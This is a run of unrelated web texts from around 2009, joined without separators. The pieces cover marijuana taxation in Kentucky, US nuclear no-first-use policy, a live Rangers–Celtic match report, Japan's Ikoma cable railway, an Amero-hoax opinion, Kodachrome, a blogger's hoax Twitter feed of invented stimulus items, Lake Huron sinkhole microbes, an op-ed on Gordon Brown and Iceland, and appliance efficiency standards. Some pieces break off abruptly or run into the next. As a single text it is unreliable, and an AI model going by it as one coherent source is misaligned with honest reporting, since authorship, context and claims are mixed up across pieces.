With the resurrection of " medical " marijuana , we can benefit from the taxing of marijuana , if it is and was to be taxed like alcohol and require licenses and fees for distribution , processing , and cultivation facilities .
We would not lose needed revenue that is spent elsewhere ( Canada in particular ) because of our current federal and state ( commonwealth ) legislation .
And in 1998 , eleven years ago , the University of Kentucky did a study that reported that hemp could be a lucrative cash crop for us .
See the article below : http://www.norml.org/index.cfm?Group_ID=3854These actions will create and sustain a new and smarter " local economy " that will create jobs , keep a greater percentage of dollars spent in our " local economy , " provide jobs ( hopefully ) with a living wage , and help us in Kentucky to become more sustainable , and deal with the current budget shortfalls ( present and forecasted for the future ) .
Thank you for your time .
President Obama wants the world to get rid of its nukes , eventually .
But , for now , it 's still official U.S. policy that America reserves the right to drop the first Bomb in an atomic war .
During the early 1980's – the peak of the late Cold War – the Soviet Union declared that it would never be the first to use nuclear weapons in a conflict .
Many of America 's strategic lions – most famously Robert McNamara , George Kennan , Gerard Smith , and McGeorge Bundy – said we should do the same .
But we never did .
Why not ?
Primarily because we thought we might actually use the weapons first .
In my view , one of the three most likely ways that World War III would have started would have been with Red Army troops surging west across Europe .
American conventional weapons probably could n't have helped the French or West Germans stop them .
But nuclear weapons could have .
The argument made by people like McNamara and Kennan was that declaring a policy of no first use could reduce tensions overall and reduce the odds of nuclear war in the other two ways that it was likely to break out between the superpowers .
That would be with a conflict that gradually gets hotter and hotter ( think Berlin in 1961 or Cuba in 1962 ) or with an accidental strike .
Maybe Soviet radar would pick up what appeared to be incoming American ICBMs and order an immediate retaliation before realizing that it was really geese flying over Finland that they 'd spotted .
If America promised not to launch weapons first , the Kennan theory went , the Soviets would be less likely to launch theirs as a way of either pre-empting or responding to a false positive of an American attack .
I recently asked a number of former Soviet arms officials about this topic while doing research in Moscow .
And almost all said that , yes , particularly during the early Reagan years – when tensions were extremely high – it would have made some difference for the U.S. to declare a policy of no first use .
They obviously understood that such talk would have been nothing close to technologically or legally binding .
But even the words would have soothed Soviet fears that the U.S. was actively planning a first strike and could have reduced the risk of disaster in the two scenarios described above .
According to Viktor Koltunov , a Soviet arms negotiator and defense official , that announcing a policy of no first use “ would really have had a lot of impact . ”
Would a policy of no first use help the U.S. today ?
It might have a similar calming effect on Russia ( and the specific refusal to declare might have an agitating effect ) .
But the authors of a recent report to the Congressional Commission on the Strategic Posture of the United States seem to remain persuaded by the same arguments that convinced some of them decades before .
A policy of no first use , they write , " would be unsettling to some U.S. allies " – which strikes me as code for Poland and other East European countries that have been invaded frequently in the past .
The authors add that such a policy " would also undermine the potential contribution of nuclear weapons to the deterrence of attack by biological weapons . "
As an addendum , one of the central critics of no first use – Paul Nitze , who authored the rebuttal in the * New York Times * to McNamara , Kennan , Bundy , and Smith – floated an interesting variation on the argument in the late 1950s .
What if , he asked , the international community banned the first use of nuclear weapons on someone else 's territory ?
In other words , what if you were only allowed to use weapons on your own territory ?
He would later abandon this idea , perhaps because of all the weird game theory issues it would create .
Under such a policy , for example , one 's adversary would have an incentive to start an attack by heading directly for your cities .
And fallout would n't stay within the launching nation 's borders .
And there 's another issue that seems particularly ironic today .
The country he talked about as the most likely beneficiary was an American ally that shared a large desolate border with the Soviet Union and that , he thought , might benefit from having nuclear weapons to fire on its own land to knock by the Sovets .
What was that nation ?
Iran .

ALSO :
" This will have to go to the top of the house . "
That 's what Scottish TV commentator Jock Brown said in the immediate wake of the most infamous Old Firm derby of recent times .
And to the top of the house it went .
The October 1987 clash at Ibrox saw Frank McAvennie , Chris Woods and Terry Butcher sent off for aggression various , while Graham Roberts got away with punching McAvennie in the mush and later ended up conducting sectarian songs in goal .
A legal inquiry followed , which took up 218 hours of police time and 74 hours of the procurator fiscal 's , and fines were imposed .
It was concluded that it had been a disgraceful affair all round , the likes of which nobody ever wants to see again .
But do we really mean that ?
The answer , this being a respectable family newspaper , can only be yes .
But do we really mean that ?

Boruc , Hinkel , Loovens , Caldwell , O'Dea , Nakamura , Hartley , Crosas , Maloney , Vennegoor of Hesselink , McDonald .
Subs : Mark Brown , Naylor , Samaras , Misun , Flood , Robson , McGeady .
Can they not be more specific about where the referee is from ?
C Thomson ( Scotland )
Kick off : 12.30 pm .
The teams run out , to a fair old bit of shouting , and we 're off !
Celtic set the ball rolling , and lose it almost immediately .
As you 'd expect , all that 's going on at the moment is a lot of high - octane hoofing .
Settle down , now .
1 min 39 sec :
The first booking of the match , as Hartley slides in on Miller and flips him into the air .
From the free kick , slung into the box from the left , Whittaker gets his head to the ball at the far post but can't direct it goalwards .
4 min : Weir sends a long ball forwards to Miller , but the Rangers striker can't control it .
Then Boruc punches a Dailly cross from the right out to Whittaker , who has a dig from 35 yards .
It 's easily charged down .
This is a reasonably confident start by Rangers .
7 min : Hartley 's early booking seems to have made the Celtic midfield a wee bit wary ; Rangers are first to every ball at the moment .
Mendes tries to set Boyd free with a clever dink over the Celtic back line but - SURPRISE HERE - Boyd can't be bothered to run after the ball .
10 min : Boruc dallies with the ball at his feet and is nearly robbed by Miller .
Celtic are looking slightly nervous at the moment .
12 min : Celtic finally show something up front , as MBM reporters ' favourite Vennegoor of Hesselink races down the left .
He so nearly manages to cut into the box , but he 's robbed by an outstanding sliding tackle nearly ( but not quite ) from behind by Bougherra .
Darren Fletcher , take notes .
14 min : From a Dailly cross from the right , Miller attempts a bicycle kick into the top - left corner .
It clanks off his knee and sails high into the stand , much to the gentle amusement of the denizens of that end , packed as it is by Celtic fans .
" Any reason for McGeady not starting ? " asks Philip Hogan .
" Have they eventually realised he 's got a worse final ball than Arron Lennon ? "
That , and the fact Strachan simply does n't like the look of his coupon .
16 min : Weir clumsily brings McDonald down just to the right of the Rangers box , near the byline .
Nakamura curls an effort towards goal , and it 's creeping under the bar before Alexander palms over .
That 'll be the first corner of the game .
17 min :
And that 'll be the second corner of the game , Weir heading a lame Nakamura delivery behind .
18 min :
The second corner of the game is plucked out of the air with ease by Alexander .
I hate corners .
18 min and a bit : Dailly is getting a lot of space down the right .
He slings yet another cross into the area .
Boyd attempts to steer a looping header into the top - right corner , but while on target , it has absolutely no pace whatsoever , and is easily claimed by Boruc .
20 min : It is raining at Ibrox .
A lot .
20 min : Great work by Millar down the left : his bustle wins a ball he should never win .
He lays it back down the line for Whittaker , whose inswinging cross-cum shot evades everyone in the area and clanks off the far post .
Celtic are able to scramble clear .
22 min : Celtic have done absolutely nothing so far , but then they suddenly spring to life when a ball 's sent into the Rangers area and only half cleared .
Caldwell has two smacks at goal , both of which are blocked .
Then Nakamura rakes a weak effort wide right .
25 min : Hinkel dinks a clever ball into the Rangers area from the right .
Neither McDonald nor MBM reporters ' favourite Vennegoor of Hesselink are on the front foot , though ; if they were , they could have sprung the static Rangers back four and poked home .
As it is , Alexander can calmly watch the ball skitter out of play wide left .
28 min : Nothing much is happening at the moment , so now 's as good a time as any to introduce you to Special Man , guardian .
co.uk 's statistics guru .
" There 's been no home win in an Old Firm Derby this season , " says Special Man .
" There 's not been no home wins in the four meetings since the 1995 - 96 season , when Rangers won the title . "
I like Special Man !
And Rangers might too .
31 min : Nakamura leads Weir and Whittaker a merry dance down the right .
His cross to the far post is tasty , but with McDonald behind the play , there 's nobody on the end of it and the chance is spurned .
32 min :
The ball comes across from the left into the Rangers area .
Whittaker bumps McDonald in the back as the striker attempts to trap the ball , sending him to the ground .
There are claims for a penalty , claims the referee - who is from Scotland , according to the specific official documentation - ignores .
I 've seen those given , though not so often in 100 mph Old Firm derbies .
35 min : Hinkel pings one into the area from the right .
McDonald heads wide left .
Again he's at the referee , this time as Dailly has a hand on his shoulder .
Rangers want to watch themselves here .
37 min : WHAT A LOVELY GOAL !!!
Rangers 1 - 0 Celtic .
This is superb stuff from Rangers , yet so simple .
A ball 's rolled towards the Celtic box from the left by Boyd .
Millar picks it up at pace , drifts a bit wider left , and clips a cross into the six - yard box just as he reaches the byline .
With Boruc totally out of the game thanks to Miller 's lovely delivery , Davis comes sliding in at speed and slips the ball into the net .
39 min : Smith is booked for an agricultural challenge on ... er... I 'm not sure .
It was a Celtic player , I can tell you that for nothing .
Anyway , this ref , who is from Scotland .
" I do believe referee Craig Thomson is originally from the fine burgh of Paisley , " reports Jamie Campbell .
" However as he works for some swanky law firm I would n't expect you 'd have much chance of ever finding him there these days . "
42 min : Loovens and Edu challenge for a bouncing ball in the centre circle .
The Celtic man decides to go in twice , first for the ball , then to have a scrape of Edu 's knee .
That 's a nasty challenge .
Edu is down for a couple of minutes ' treatment and in genuine pain , but it looks like he 'll be OK to continue .
Loovens , meanwhile , escapes unpunished .
Naughty Loovens .
45 min : Celtic come so close to equalising , as Nakamura flings a corner in from the right and MBM reporters ' favourite Vennegoor of Hesselink heads powerfully past the flailing Alexander .
Sadly for Celtic , the goalscorer Davis is stationed on the line and , falling backwards , hacks clear .
That 's wonderful play all round .
HALF TIME : Rangers 1 - 0 Celtic .
After two minutes of added time , presumably for the Edu injury , the whistle 's blown and the teams trudge off , Rangers wet but happy , Celtic simply drenched .
And we 're back again !
And we 're off again !
Boyd sets the ball rolling .
This is such a crucial 45 minutes of football coming up .
" As an exuberant youth I did a ' fun run ' round Bellahouston Park and was awarded with a certificate signed by Old Firm favourites Ronnie Glavin and Derek Parlane , " exclaims Gregor Sharp , apropos nothing at all .
Now , if someone came up to you in the pub and announced this without any prior bidding , you 'd shuffle quietly away , would n't you ?
Unless you were feeling particularly lonely , in which case you 'd strike up conversation .
Read what you will into this email 's publication , then .
Did you come first , Gregor ?
47 min : Celtic attempt to ladle the pressure on early in the half , McDonald busying himself as usual down both wings , but nothing comes of his early bustle .
In fact it 's Rangers who nearly create the first chance of the half , Mendes breaking upfield with purpose , but his final ball is towards nobody .
It 's Special Man !
50 min : Special Man is back !
" It 's omninous for Celtic , " he writes .
" No side has overturned a deficit to win in the Old Firm derby since December 2002 when Rangers won 3 - 2 at Ibrox - and there have been 23 matches since then .
Also , Celtic have lost the last eight games in which they have conceded first to Rangers . "
I like Special Man !
I 'm not sure Celtic fans will be liking Special Man at the moment , though .
51 min : McDonald looks the most likely to do something for Celtic : he rampages down the inside - right channel and so nearly breaks clear , but Whittaker is on his tail and forces him to miscontrol out of play .
That was a decent run , though .
Celtic have started the half much the stronger .
53 min : Celtic have a free kick in a dangerous position , 35 yards out on the left , but Nakamura 's delivery is , for once , witless , far too high and close to the keeper .
Alexander plucks the ball from the air .
Down the side of the pitch , McGeady warms up ostentatiously .
54 min : Why has n't Gregor Sharp answered my question ?
The strange man in the pub would answer my question !
55 min : So would Special Man .
56 min : Celtic are enjoying a lot of the ball , but are n't doing anything with it .
It 's just like watching Barcelona .
57 min :
On the touchline , Gordon Strachan is taking tactical instruction from Garry Pendrey .
I 'm letting that hang there .
58 min : Hinkel teases in a delicious cross from the right , finding the head of MBM reporters ' favourite Vennegoor of Hesselink , eight yards out in the centre .
The big man 's header is uncharacteristically weak , though , allowing Alexander to smother on the line with ease .
60 min :
This really should have been 2 - 0 to Rangers .
Chasing a superb defence - splitting pass by Davis , Boyd powers free of Caldwell in the centre and tears into the box .
He must whack home , surely - but Boruc comes out quickly to make himself big , and Boyd hammers his shot straight at the keeper .
What a save .
What a miss .
62 min : " Even the subscribers to the rational Celtic fans ' website , cqn , are furious that McGeady is n't on , " reports Alec McAulay .
" If he does n't come on and Celtic lose there will be an avalanche of criticism ; and if he comes on there will still be an avalanche - either he does well , so should have played from the start , or does n't shine , in which case he never got a proper chance .
Though Gordon must be accustomed to his relative unpopularity with the Celtic fans by now it must be taking its toll .
I guess he 'll slam the door when he leaves . "
Well , here we go , because Maloney goes off - and McGeady comes on .
64 min : Rangers have steadied the ship a wee bit , after Celtic 's strong start to the half .
They 're seeing a bit more of the ball than before , though not much is happening for them creatively .
This promises to be a dramatic half - hour of football ( unless there are only three minutes of added time ) .
66 min : Davis zips down the right and cuts the ball back for Boyd in the middle .
Loovens somehow gets in ahead of the striker , just as he's about to shoot from six yards out , and slices the ball wide right .
The corner is wasted .
67 min : Hinkel , who is looking increasingly dangerous down the right , wins a corner after a Homeric battle with Whittaker .
That 's some good old - fashioned battling .
From the corner , Celtic ping the ball around in front of the Rangers area for a while , before Dailly gets fed up and upends McGeady , 25 yards out , just to the left of the box .
Nakamura steps up to take ...
68 min : ... but his delivery is n't the best .
Low and hard , the free kick causes minor bedlam in the six - yards out , but nobody 's ever going to get a shot in on goal from that , and the ball 's eventually hacked clear .
70 min : Lafferty comes on for Smith .
You can almost touch the tension at Ibrox .
71 min : Lafferty 's first contribution is to slide in on Nakamura and catch the Celtic midfielder with his studs .
His second contribution is to look offended as he 's issued with a yellow card .
72 min : Millar follows
Lafferty into the book for arguing with the referee over the latter 's yellow .
It 's Special Man !
Again !
75 min : " The referee likes chess , golf , squash and going to the cinema , " reports Special Man .
He sounds like a well - rounded individual for sure .
A bit like Special Man !
76 min : Edu breaks brilliantly down the left and feeds Mendes , just to the left of the box .
The midfielder fannies around , though , and eventually lays off to Miller , who goes softly to sleep , allowing Nakamura to scoot up the other end .
Seconds later , McGeady finds himself in the Rangers box , to the right of goal with the ball at his feet .
He shifts it inside and , from six yards , hammers a shot just wide right of the net .
That 's now 1 - 1 in great chances missed .
77 min : MBM reporters ' favourite Vennegoor of Hesselink finally buggers off , to be replaced by Samaras .
79 min : This is all Celtic again .
Rangers are beginning to look very nervous .
Hinkel , Samaras and McGeady are all heavily involved as Celtic ping it around in front of the area , but the pressure 's suddenly off the home side as Samaras stupidly upends Bougherra as the defender struggles to hack clear .
81 min : O'Dea is replaced by Naylor .
82 min :
This is just going to be attack versus defence now .
Everything from Celtic 's point of view is going through McGeady ; Rangers are increasingly relying on the raw energy of Edu , who is having a very decent game in midfield , and breaking up a good proportion of the opposition 's attacks .
83 min : McGeady stabs a low cross in from the left .
Weir clears - but slips as he does so and only sends the ball towards Crosas on the edge of the area .
The midfielder tries to curl one into the top - right corner , but his effort is overcooked and flies high into the stand .
84 min :
This is breathless end - to - end stuff all of a sudden .
Mendes bustles into the Celtic area down the inside - right channel but dallies and allows Caldwell to slide behind for a corner .
From it , Boyd is afforded an unchallenged header dead central , eight yards out , but powers miles over .
That 's a terrible effort .
85 min : Boyd heads a Davis right - wing cross miles over the bar .
That 's equally useless .
He 's had a shocker today .
With this in mind , Walter Smith hauls him off , replacing his man with McCulloch .
87 min : Celtic win a corner and instigate an almighty scramble in the Rangers box .
But Dailly , Bougherra , Weir and Whittaker are tenacious , and evenually push Celtic out of their area .
The ball 's dinked back in by Crosas , but Samaras is miles offside .
This is tense .
89 min : Caldwell is booked for a ridiculously late challenge on Mendes in the centre circle .
The Rangers midfielder takes his time to hobble off the pitch .
I 'm sure he 'll be coming back quite soon .
90 min :
There are going to be four minutes of stoppage time .
90 min +1 : Well out of his box , Boruc shanks a long clearance .
Edu picks it up , and thinks about Alonso- ing it into the net from his own half .
To ensure this does n't happen , Naylor hacks him down .
That 's a yellow card .
Rangers are perfectly happy to waste time .
90 min +2 : Miller sashays down the left and , near the corner flag , wins a cheap free kick .
90 min +3 : From the free kick , Millar plays keepball in the corner - and wins a corner .
From it , Mendes has a smack from 20 yards - but Boruc claims and sets Celtic upfield to win a corner of their own !
Special Man says bye bye
FULL TIME : Rangers 1 - 0 Celtic .
Boruc comes up to challenge for the corner .
Celtic can't do anything with it , though .
Boruc does n't even bother to go back towards his goal , and eventually the referee blows up .
Rangers are top of the table with only three matches to go and their destiny in their own hands !
What 's up next ?
Special Man will tell you : " Rangers go to Hibs who they have beaten three times this season whilst Celtic host Dundee United who they have n't beaten once ( three draws ) . "
I love Special Man !
Only a few years after trains first starting running in Japan back in the late 1800 ’s , and when it still took about 12 hours to travel from Tokyo to Osaka , the Ikoma Cable Railway was established in 1918 in the Kansai area .
It is the oldest cable car company in Japan and is run by Kintetsu .
The lines official name is Ikoma Cable Line ( 生駒鋼索線 ) .

It is great to see that this historical line is still in operation today and that the rail cars have been upgraded to give tourists an even more entertaining experience .
The trains certainly create quite a bit of attention and are a perfect tourist attraction for the area to complement the local theme park .
Hōzanji Line 1 used classical 1928 cars until 2000 , when they were replaced to the current fancy - decorated cars .
Since then , dog - faced “ Bull ” and cat - faced “ Mike ” serve the line , both officially being Type Ko 11 .
Sanjō Line uses organ - like “ Do - Re - Mi ” , cake - decorated “ Sweet ” , both officially Type Ko 15 .
Hōzanji Line 2 uses ordinary - shaped Type Ko 3 cars , nicknamed “ Yume - Ikoma ” .

Useful TRUTH
The new Amero currency is just a hoax
Added by ArmanGhertu on Apr 22 , 2009 | Visited by 10957 | Voted by 94 persons
The economic downturn caused great speculations about failure of the US dollar and some conspiracy theories about introduction of a new North American currency named Amero .
Everybody failed , to start with .
There is not a single winner from the current events .
As for the US dollar , to my mind , it not only will survive all these insinuations , but on the contrary there are sufficient prerequisites that it will strengthen its leading world positions .
First of all , this is still the main world currency in which all major commodities are valued , and I see no other competitor that can substitute the buck globally .
The depression will eventually come to an end ( rather sooner than later ) , and the demand for raw materials and other main commodities will rapidly increase - the Earth population and its necessities are still growing in geometrical progression - that is why the US dollar does not have any reason to fall from the market .
Secondly , the Euro currency , so far the only currency able to partially substitute the dollar , is in deep troubles itself and will put at serious test the whole unified decision making system and the regulatory capacity of the European Union .
The European economy is in bad shape , drastically reducing the investment attractiveness of its traditional industries - as a consequence , we may expect with a very high degree of probability that Euro will fall towards the US dollar very soon ( which will become beneficial for European exporters ) .
Thirdly , the United States economy , though criticized now , is a unique phenomena , both in sense of its ability to rapidly react to and overcome emerging problems , as well as in its huge unlimited capacity of growth , which provides a strong drive for the whole world .
While the traditional European economies are based on �asset - backed � approach for financing new investments , the American model has been the most dynamic economy because it also vastly encourages investments into new ideas , into projected cash - flows .
So , even if only one in ten new ventures would succeed , it drags along other productions and other new ventures .
Hence , dynamism and high competitiveness , development of new technologies and innovations , which all are the key success factors for and a strong motivation in a modern economy .
In Europe , if you failed once , you are basically in a black list forever .
In US one can try his luck again and again .
Europe is 3000 meters hurdles : exhausting and with a low motivation , whereas US is 4x100 meters relay : fast , competitive , with several chances for coming first and win the prize .
Pumping too much cash into the economy and making it indebted for three generations ahead ?!
It seems not to be an issue of concern in a monetarist economy : the debts are virtual , they are somewhere on the papers in the future , whereas the current real economy today should have as much cash as possible to keep it driving , with only one important condition - keep inflation under control with all available means .
And it is working , and will work well until it works in one leading world center .
As soon as someone else would like to repeat the same , then it will definitely be a global mess .
If according to marxist - leninist theory , money is the blood of the economic vessels , then it should be a blood of one group - adding another type of blood would kill the body of the international economy .
No one changes horses during a river crossing .
Renouncing the slightly shaken , but still strong dollar , and changing it with an unknown currency linked to three different states ( USA , Canada and Mexico ) not fully prepared for that , would potentially create a dangerous vacuum in the international economy .
That is why all these rumors about Amero are probably nothing more than intentionally destabilizing speculations .

Kodachrome , it gives us those nice bright colors
Gives us the greens of summers ,
Makes you think all the world 's a sunny day , oh yeah !
I got a Nikon camera , I love to take a photograph
So momma , do n't take my Kodachrome away .
- Paul Simon , on photography ’s greatest film
Kodachrome is dead .
The film so great that rock stars sang about it is the latest old - school technology to fall under the wheels of the digital revolution .
The photographic community has already endured the recent demise of the Polaroid , but the company 's announcement that it will no longer make the film is a bigger blow .
Kodachrome was the first color still film readily available to everyone , but it was widely regarded as the film for professional photographers .
It was the film for the globe - trotting National Geographic shooters .
It was the film referred to in movies and media , and its color was a visual stamp on the world 's retinas for almost 75 years .
Kodachrome 's red was the hue that photographers using other films could only dream of .
You could n't process this film in your basement , nor could you get it processed at your local photography store .
This special film had to be sent off to Rochester , New York , to the great yellow halls of Kodak headquarters to be processed in the secret Kodachrome soup .
When your copy of National Geographic hit the mailbox , you 'd marvel at the richness , clarity and crispness of color those photographers captured .
The film was synonymous with the early days of adventurous photographers in exotic lands , capturing photographs of things people and places few knew existed .
Because Kodachrome was a slide film , also known as transparency film , it was not as forgiving of the exposure - challenged and getting those amazing photographs you saw in your mind 's eye was n’t as easy as you had hoped .
This was part of the allure of Kodachrome .
If you could master all the challenges , you too could have a frame worth singing about .
Unlike what some would have you believe , these were not the good old days of photography .
There was no auto - exposure , no auto - focus , no RAW files , no ETTL , no chimping and no " fixing it in Photoshop . "
But I challenge anyone to take a peek at Uncle Bob 's Kodachromes in the basement and not be in awe of the color renditions and the sensory overload of actually holding a chrome up to the window and seeing the world in a way we can't begin to appreciate while staring into our computer screens .
Long live Kodachrome .
Back during the debate for HR 1 , I was amazed at how easily conservatives were willing to accept and repeat lies about spending in the stimulus package , even after those provisions had been debunked as fabrications .
The $ 30 million for the salt marsh mouse is a perfect example , and Kagro X documented well over a dozen congressmen repeating the lie .
To test the limits of this phenomenon , I started a parody Twitter account last Thursday , which I called " InTheStimulus " , where all the tweets took the format " InTheStimulus is $x million for ______ " .
I went through the followers of Republican Twitter feeds and in turn followed them , all the way up to the limit of 2000 .
From people following me back , I was able to get 500 followers in less than a day , and 1000 by Sunday morning .
You can read through all the retweets and responses by looking at the Twitter search for " InTheStimulus " .
For the most part , my first couple days of posts were believable , but unsourced lies :
$ 3 million for replacement tires for 1992 - 1995 Geo Metros .
$ 750,000 for an underground tunnel connecting a middle school and high school in North Carolina .
$ 4.7 million for a program supplying public television to K - 8 classrooms .
$ 2.3 million for a museum dedicated to the electric bass guitar .
The responses , as you might imagine , were overwhelmingly positive .

<----- you can't make this shtuff up
In my first three days , I made about thirty posts .
I got a couple people suggesting that I cite my sources to make the Twitter feed more useful , but only one person actually called me out to say " this is fake " .
And it was an Obama supporter I had accidentally followed , who promptly blocked me .
On Monday evening , I decided to test the bounds of what would be believed .
One of my first " crazy " ones was also my most popular : " $ 2 million for Shamwows . "
Any right - minded person would start to have doubts at this point ( right ? ) , but the responses :
carmcarm3 : RT @InTheStimulus is $ 2 million for Shamwows .
( Is this for cleaning up all of Obamas BS ? )

A couple others finally called me out on this one .
However , the rate of people unfollowing me was slower than those who were adding me .
Even now , my number of followers is going up , even with these tweets :
$ 473,000 to Fueled by Ramen , record label for such bands as Fall Out Boy .
$ 4 million for Obama bobbleheads .
$ 104,000 to exhume President Taft .
$ 465 million for massive air conditioners to combat global warming .
And finally , $ 855,000 for the gambling debts Laura Bush incurred on diplomatic trips between 2004 - 2008 .
Conservative anger towards Democrats has really blinded them , to the point of having broken BS detectors .
Consider a response to the Laura Bush tweet : " ScrapDiva : RT @InTheStimulus : is $ 855,000 for the gambling debts Laura Bush incurred on diplomatic trips between 2004 - 2008 .
< how is this our problem ? > " .
The twitterer 's first instinct is n't to verify that Laura Bush indeed had a gambling problem , since presumably it 's a fact she 's never heard before .
Instead , it 's to attack the writers of the stimulus for dumb spending ( which it would have been , I agree ) .
There are a couple lessons I like to draw from this .
First , conservative activists are crazy and gullible .
But second , be careful of what you read and believe on Twitter .
I think some of the leeway granted to InTheStimulus is based on the soundbite nature of the site ; people can get away with no citations , which is less likely than with a conventional blog .
And be careful , because if I could do InTheStimulus , a conservative could do a Twitter feed tricking us .
In any case , I think it 's really funny .
Update :
Wow , I was n't expecting this to get noticed again .
The InTheStimulus account does n't exist any more .
After this diary , some conservatives noticed it and spread around the word that it was a hoax .
This is a surprisingly level - headed response by one of my followers .
I did change the username , delete all the old posts , and start again with the same followers list with TheAngryRighty - personally , I 'm amazed you can do something like that .
I have n't touched it in a couple weeks , though .
Sink holes in the Thunder Bay region of Michigan , several hundred feet deep , are exposed to the ancient , mineral rich Paleozoic era bedrock , where the minerals leech out into the water creating a very dense , mineral rich , oxygen free underwater eco-system .
“ You have this pristine fresh water lake that has what amounts to materials from 400 million years ago … being pushed out into the lake , ” said Steven A. Ruberg ,
Similar to the undersea vents , these sink holes harbor odd bacteria adapted to extreme environments .
They grow in large " pony - tails " or in purple towers along the bottom .
The Lake Huron sinkholes are dominated by brilliant purple mats of cyanobacteria -- cousins of microbes found on the bottom of permanently ice - covered lakes in Antarctica -- and pallid , floating pony - tails of other microbial life , according to the journal article .
The saltwater venting out of the sinkholes is hostile to most life forms because it lacks oxygen , the scientists said in the article ..
-- article
Video found at the Annis Water Resources Institute site on the Sinkhole Ecosystem Project page .
For those out there who feel Lake Huron is the unsung third wheel of the largest Great Lakes , this is it , baby .
This is pretty darn cool .
Researchers believe these sink holes might also be found in Lake Superior and Lake Michigan , but so far that 's just a hypothesis .
Right now they appear to be unique to Lake Huron .
And they 've been right under our noses this whole time , and not even that far from shore , looks like .
The Great Lakes have been sorely un-explored and under - researched for too long .
They 've just been part of the scenery , used to transport goods and raise fish for eating .
It 's discoveries like this that should make people sit up and pay attention to the wonders in their back yards ... and more importantly , it 's discoveries like this that should warrant greater interest in researching the Great Lakes and fanning the urgency of Great Lakes preservation efforts and funding .
Because it 's just so frickin ' COOL .

Life at the very bottom ( skip )
In this case , scientists wonder if the microbes may be truly primordial .
Researchers found that the purple bacteria can photosynthesize as easily in sulfur - rich water as they can in fresh water , an ability suited to the dim and sulfur - rich conditions of shallow , primeval seas that existed billions of years ago .
( skip )
Cameras on the submersible recorded something divers had seen and talked about for years — vast purple carpets mottling the bottom of the shallower sinkholes , where dim surface light still reaches .
In deeper , darker water , the submersible found white microbial mats similar to those around deep - ocean heat vents .
One thing the researchers tried to figure out was what on Earth those purple colonies were .
They found that the single - celled microbes banded together to form filaments that in turn joined to form mats .
When debris fell on the mats , the bacteria got on top of it by crawling toward the light .
The sticky ooze could climb a pebble in a laboratory water tank in a few hours , and crawled up the sides of beakers .
Gordon Brown is at it again .
It seems – for some mysterious reason – that every time he finds himself in trouble at home he attacks Iceland .
During prime minister 's questions in the House of Commons on 6 May , Brown ­said that the Icelandic authorities are responsible for the loss of the cancer charity at Christie 's in Manchester and claimed to be in discussion with the IMF on how Iceland can " repay the losses they are responsible for " .
Brown went on to wash his hands of the matter and repeatedly said : " The fact is we are not the regulatory authority " .
It might be interesting for UK voters to know that the PM 's statements are completely false .
Let 's look at some facts : Christie 's business was with Kaupthing Singer & Friedlander ( KSF ) , a UK - based bank that was regulated by the FSA and therefore covered by the UK depositor protection scheme .
This is , for example , clearly stated in the Treasury committee report published last month .
This is not the first time Brown 's government has given false statements about its relationship with Iceland .
On the morning of 8 October , following a conversation with the Icelandic finance minister , Alistair Darling found himself in trouble during an interview with John Humphrys during Radio 4's Today programme and said : " The Icelandic government have told me , believe it or not , have told me yesterday they have no intention of honouring their obligations there . "
As is stated in the Treasury committee report , the transcript of the conversation shows that Darling 's testimony was also wrong .
Later on that dark October day Gordon Brown said to the world media that Iceland was virtually bankrupt , which was not true .
Then he invoked the Anti-Terrorism Act ( 2001 ) to freeze all Icelandic assets in the UK .
The shameful actions of Gordon Brown and Alistair Darling prompted the run on Kaupthing and subsequently the chancellor used the Banking Special Provisions Act ( 2008 ) to transfer most of KSF 's retail deposits to the Dutch bank ING .
Interestingly , at the same time , the UK government was virtually throwing money at other UK - based banks , some of them also under foreign ownership .
Perhaps it was simply easier to bully Iceland than , let 's say , Germany .
The Anti-Terrorism
Act is still freezing Landsbanki's properties in the UK .
The act is in clear violation of several international laws , including the European Economic Area agreement .
It can therefore easily be argued that the Labour government has by default also taken over the bank 's obligation in the UK – including payments out of the Icesave accounts .
Why the Icelandic government has not used this obvious argument to transfer the responsibility on Brown 's own shoulders is a mystery to most people in Iceland .
By killing off Kaupthing , the Labour government is to blame for the troubles Christie 's is facing .
Once again , it seems , Brown was trying to save his own political skin by attributing all blame to Iceland : now , for the troubles of the cancer charity in Manchester he himself is responsible for .
From abroad at least , it looks quite remarkable that such a small politician can be the leader of Great Britain .
In a dimly lit Osram Sylvania lab humming with sensitive electronic equipment sits a potential environmental breakthrough – a glowing pink fluor­escent bulb that may one day lead to super - energy - efficient lighting without mercury .
Currently , all fluorescent lights – including energy - saving compact fluorescent bulbs – use at least a little toxic mercury .
But before a new nonmercury lamp can become a hoped - for environmental turning point , it must become frugal with electricity , too .
This one is n’t – yet .
For lighting and appliance manufacturers alike , energy efficiency is now Job One .
Driven by legislative mandates and the Obama administration ’s new push on energy , the US is on the cusp of a massive drive for efficiency breakthroughs in appliances that could pay off big for consumers and the environment by increasing energy savings and slashing the number of power plants needed to run all those gadgets .
At least 25 new federal energy - efficiency standards for consumer lighting and appliances are slated to be revamped over the next four years .
Together , they could deliver about one - fifth of the administration ’s goal of cutting electricity use by 15 percent by 2020 , the American Council for an Energy - Efficient Economy reports .
By slashing the energy use of everyday appliances such as microwave ovens , clothes dryers , washing machines , pool heaters , refrigerators , and room air conditioners , the new standards could :
• Save about 165 billion kilowatt hours annually , cutting consumer and business energy bills by some $ 16 billion – about equal to the current combined annual electricity use of households in Illinois , Michigan , Ohio , and Indiana .
• Reduce peak electricity demand by about 60,000 megawatts , enough to eliminate the need for 200 power plants , each with 300 megawatts of capacity .
• Slash carbon dioxide ( CO2 ) emissions of power plants by about 150 million tons annually .
“ Energy efficiency can be improved very quickly , ” Secretary of Energy Steven Chu told National Geographic magazine recently .
“ Appliance standards , ka- BOOM , can be had right away . ”
In a February speech to Department of Energy ( DOE ) employees , President Obama declared his commitment to a faster appliance standard - setting schedule and touted its benefits .
“ We ’ll save , through these simple steps over the next 30 years , the amount of energy produced over a two - year period by all the coal - fired power plants in America , ” Obama said .
Historically , appliance standards have been one of the most important ways to bolster US energy savings .
They accounted for 20 percent of overall savings from all energy - efficiency policies adopted from the 1970s to 2000 , according to the National Commission on Energy Policy .
Still , there ’s plenty of room for improvement , experts say .
Many microwave ovens , for instance , use four or five watts of electricity just sitting in standby mode .
New standards could mandate one watt , says Andrew deLaski , director of the Appliance Standards Awareness Project ( ASAP ) , which is sponsored by environmental groups .
Lighting is a huge energy consumer , too , at 22 percent of total US electricity use , the DOE reported in 2002 .
Eliminating conventional incandescent light bulbs beginning in 2012 , as mandated by the 2007 energy bill , will save an estimated $ 40 billion , cut the need to build a dozen coal - fired power plants , and slash 50 million tons of CO2 emissions .
